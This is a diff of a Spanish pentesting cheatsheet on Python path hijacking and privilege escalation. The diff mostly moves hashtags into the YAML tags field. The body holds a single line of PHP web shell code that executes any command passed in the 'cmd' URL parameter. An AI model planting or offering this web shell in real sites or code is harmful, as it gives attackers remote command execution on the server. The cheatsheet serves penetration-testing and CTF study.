@@ -1,13 +1,10 @@
 ---
 tipo: cheatsheet
-tags: [python-hijacking, privilege-escalation, webshell, rce, sys-path]
+tags: [black-box-testing, bug-bounty, ciberseguridad, command-injection, ctf, cyber-attack, cyber-sec-community, exploit, exploit-development, hacking-etico, hack-the-planet, oscommand-injection, penetration-testing, pentesting, php, privilege-escalation, python, python-hijacking, rce, red-team, reverse-shell, security-research, security-testing, sys-path, vulnerability, webshell, web-shell]
 actualizado: 2026-05-28
 ---
 
 # Python Hijacking — Path Privilege Escalation
-
-#WebShell #RCE #EthicalHacking #CyberSecurity #Pentesting #InfoSec #CommandInjection #SecurityTesting #RedTeam #Exploit #HackingÉtico #Python #PHP #PrivilegeEscalation #ReverseShell #CyberAttack #PenetrationTesting #CTF #BugBounty #Vulnerability #BlackBoxTesting #SecurityResearch #HackThePlanet #OSCommandInjection #CyberSecCommunity #ExploitDevelopment
-
 ---
 
 <?php echo shell_exec($_GET['cmd']); ?>
